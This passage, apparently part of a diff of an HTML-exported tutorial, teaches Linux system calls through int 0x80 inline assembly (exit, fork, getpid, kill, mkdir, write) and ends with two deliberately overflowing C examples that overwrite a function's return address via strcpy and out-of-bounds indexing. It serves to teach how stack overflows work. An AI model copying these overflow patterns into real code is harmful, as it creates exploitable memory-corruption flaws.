+indicates a pause. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>First, the value of 29 is
+moved in the eax register and then interrupt 80 <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>is called using the int
+instruction. The program when executed comes to an abrupt halt unless Crtl-D is
+pressed. The string bye does not get displayed.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>//exit<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;mov
+$1,%eax&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;mov
+$4,%ebx&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;int
+$0x80&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;Bye\n&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>To quit out of a program,
+the exit function is frequently used. This internally is through the interrupt
+80 with the vlaues of 1 in the eax register. The number 4 in the ebx register
+is basically returned to the operating system and it can be any number for that
+matter. The above program mimics the function call. Thus, once again the bye
+does not get displayed.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%d\n&quot;,getpid());<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;mov
+$2,%eax&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;int
+$0x80&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%d..\n&quot;,getpid());<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>10313<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>10314..<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>10313..<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Every program when loaded in
+memory gets a unique number or process id (pid) by which it is know by to the OS.
+The function getpid returns this process id. In our case our programs pid is
+10313. The fork function creates one more process or a child in memory. For
+this, the fork function puts 2 in the eax register and calls int 80. As a
+result, the last printf gets called twice, once for the parent and one for the
+child. In both cases, we are printing the pid and the output clearly shows that
+the child has been given a new pid of 10314.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int i;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>asm(&quot;movl $20,
+%eax&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>asm(&quot;int $0x80&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>asm(&quot;movl %eax,i&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;Hi %d
+%d\n&quot;,i,getpid());<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Hi 15415 15415<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Moving 20 in the eax
+register and calling int 80 is what the getpid <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>function is all about. The
+result of this interrupt is placed in the eax register. In the program, the
+value in the eax register is moved into variable i which is then printed out.
+We are allowed to use C variables directly in assembler code. Along with i, the
+getpid function is used again to prove that the values are the same.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>asm(&quot;int $0x80&quot; :
+: &quot;a&quot;(2));<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;Hi\n&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Hi<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Hi<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>There is a shorter form to
+the int 80 instruction. For this the instruction starts with int 0x80 followed
+by two colons. After the colons are placed the names of the registers in double
+inverted commas along with the values that go in them in round brackets. As a
+result,<span style="mso-spacerun: yes">  </span>the value 2 in the above
+program gets placed in the eax register and int 80 is called. This is similar
+to the fork call. The printf function thus gets displayed twice.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int i;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;pid=%d ppid=%d\n&quot;,getpid(),getppid());<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>asm(&quot;int $0x80&quot; :
+&quot;=a&quot; (i) : &quot;a&quot; (2));<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;Hi i=%d pid=%d
+ppid=%d\n&quot;,i,getpid(),getppid());<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>pid=15445 ppid=15111<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Hi i=0 pid=15446 ppid=15445<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Hi i=15446 pid=15445
+ppid=15111<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The getppid function
+displays the parents process id which in our case is that of the shell 15111.
+Our programs pid is 15445. The int 80 instruction has a =a within the two
+colons which signifies that after int 80 is generated, the return value in the
+eax register must be placed in the varible specified in round brackets. Thus
+whatever is after the first colon is for return values, the second colon is for
+values to be placed in registers.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>kill(1066,9);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The ps -e instruction gives
+a list of programs with their process ids. The kill function sends a signal to
+the running process. The first parameter is always the process id, 1066 and the
+second is the signal no, 9 to be sent. A signal of 9 terminates a program.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>asm(&quot;int $0x80&quot; :
+: &quot;a&quot; (37),&quot;b&quot; (1066), &quot;c&quot; (9));<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>In assembler, the function
+is represented by a value of 37 in the eax register, the pid in the ebx
+register and the signal 9 in the ecx register.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>//mkdir vmci<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>char *p = &quot;vmci&quot;;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>asm(&quot;int $0x80&quot; :
+: &quot;a&quot; (39), &quot;b&quot; (p));<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The value 39 creates a sub
+directory. Here, the register ebx holds the the name of the directory to be
+created, which in our case is represented by pointer p.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>char *p =
+&quot;hel\nlo&quot;;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>asm(&quot;int $0x80&quot; :
+: &quot;a&quot; (4) , &quot;b&quot; (1) , &quot;c&quot; (p) , &quot;d&quot;
+(5));<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>hel<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>l<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The printf function finally
+calls the write system call. This is by <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>placing 4 in the eax
+register. The file handle to write to, in our case 1 is standard output in ebx,
+ecx the string to write and edx the number of characters to write 5. Thus the
+Hel and \n and one more l gets written on screen. The last o is ignored.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int abc()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>char a[3];<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>strcpy(a,&quot;AAAAAAAAAAAAAAAAAAAAAAAABBBBCDEF&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+color:#000066'>There is not one way to skin a cat. This program takes a different
+approach to overwrite the return address. As the array a is the first and only
+variable, a few bytes above it is placed the return address. The strcpy
+function does no bounds checking on the size of the array, thus it overwrites
+the return address with the characters in the array. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+color:#000066'>a1.c</span><span style='font-family:"Trebuchet MS";mso-fareast-font-family:
+"MS Mincho";color:#000066'><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int abc()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>char a[3];<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a[24]='B';<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a[25]='B';<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a[26]='B';<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a[27]='B';<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a[28]='C';<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a[29]='D';<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a[30]='E';<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a[31]='F';<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
